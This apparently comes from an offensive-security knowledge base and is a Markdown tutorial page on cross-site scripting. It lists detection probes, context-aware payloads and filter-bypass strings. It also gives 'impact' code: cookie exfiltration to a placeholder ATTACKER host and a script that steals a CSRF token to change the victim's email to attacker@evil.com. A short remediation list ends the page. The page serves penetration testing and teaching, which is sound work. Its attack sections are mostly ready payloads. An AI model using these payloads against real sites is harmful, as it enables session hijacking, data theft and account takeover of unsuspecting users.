---
tags:
  - Web
---

# :material-language-javascript: Cross-Site Scripting (XSS)

<span class="pill pill-medium">common</span> <span class="pill pill-info">web</span>

**XSS** lets you execute JavaScript in another user's browser in the context of the target origin. That means stealing sessions, keylogging, rewriting the page, or driving account takeover.

!!! abstract "TL;DR"
    Find where your input is reflected/stored, figure out the **HTML context** it lands in, and break out of that context to inject a `<script>` or event handler.

## :material-shape: The three types

| Type | Where the payload lives | Trigger |
| --- | --- | --- |
| **Reflected** | In the immediate response (URL/param) | Victim clicks your crafted link |
| **Stored** | Saved server-side (comment, profile) | Any user who views the page |
| **DOM-based** | Never touches the server; client JS sinks | Fragment / client-side routing |

## :material-magnify: Detection

Inject a unique marker and see where it lands **unencoded**:

```html
xsspoc1337
"><svg/onload=alert(document.domain)>
'"><img src=x onerror=alert(1)>
javascript:alert(1)
```

Then view source / the DOM: is your marker inside a tag, an attribute, a `<script>` block, or an HTML comment? The context decides the payload.

## :material-code-tags: Context-aware payloads

=== "HTML body"

    ```html
    <script>alert(document.domain)</script>
    <img src=x onerror=alert(document.domain)>
    <svg onload=alert(document.domain)>
    ```

=== "Inside an attribute"

    ```html
    " autofocus onfocus=alert(1) x="
    "><script>alert(1)</script>
    ' onmouseover='alert(1)
    ```

=== "Inside <script>"

    ```javascript
    </script><script>alert(1)</script>
    ';alert(1);//
    ${alert(1)}      // template literal context
    ```

=== "DOM sink"

    Look for input flowing into dangerous sinks:
    ```javascript
    element.innerHTML = location.hash        // sink
    document.write(location.search)
    eval(userControlled)
    // Source examples: location.hash, location.search, document.referrer, postMessage
    ```

## :material-filter: WAF / filter bypass

<span class="pill pill-hard">when the easy stuff is blocked</span>

```html
<!-- Case & no parentheses -->
<sVg/OnLoAd=alert`1`>
<!-- Encoded event handlers -->
<img src=x onerror=&#97;lert(1)>
<!-- No spaces (use slashes/newlines) -->
<img/src/onerror=alert(1)>
<!-- Nested to defeat naive tag stripping -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<!-- Exotic tags/events -->
<details/open/ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

!!! tip "HTML5 event-handler cheat"
    When `<script>` is filtered, event handlers on `svg`, `img`, `body`, `details`, `video`, `iframe`, and `input` are your friends. [PortSwigger's XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) is the canonical list.

## :material-flash: Turning XSS into impact

Not `alert(1)` in a report — show real impact.

!!! loot "Session / cookie theft"
    ```javascript
    // Exfil non-HttpOnly cookies to your listener
    new Image().src='https://ATTACKER/c?'+encodeURIComponent(document.cookie);
    // Or full request-capable exfil
    fetch('https://ATTACKER/c',{method:'POST',body:document.cookie});
    ```
    Catch it with `python3 -m http.server` or an interactsh/Burp Collaborator URL.

!!! loot "Account takeover via CSRF-token theft"
    ```javascript
    fetch('/account',{credentials:'include'})
      .then(r=>r.text())
      .then(html=>{
        const t = html.match(/csrf" value="([^"]+)"/)[1];
        // now submit an email/password change with the stolen token
        fetch('/account/email',{method:'POST',credentials:'include',
          headers:{'Content-Type':'application/x-www-form-urlencoded'},
          body:`csrf=${t}&email=attacker@evil.com`});
      });
    ```

!!! opsec "HttpOnly stops cookie theft, not XSS"
    If cookies are `HttpOnly`, pivot to **in-browser actions** (change email, add API key, read data) rather than exfiltrating the cookie. The session is still yours while the JS runs.

## :material-shield-check: Remediation

- **Context-aware output encoding** (HTML, attribute, JS, URL — different each).
- A strict **Content-Security-Policy** (`script-src 'self'`, nonces, no `unsafe-inline`).
- `HttpOnly` + `Secure` + `SameSite` cookies.
- Frameworks that auto-escape (React, modern templating) — but watch `dangerouslySetInnerHTML`.

## :material-link-variant: Related

- Pairs with [Auth Bypass](auth-bypass.md) for full account takeover.
- CSP bypass research overlaps with [SSRF](ssrf.md) exfil techniques.
- Reference: [OWASP XSS](https://owasp.org/www-community/attacks/xss/).
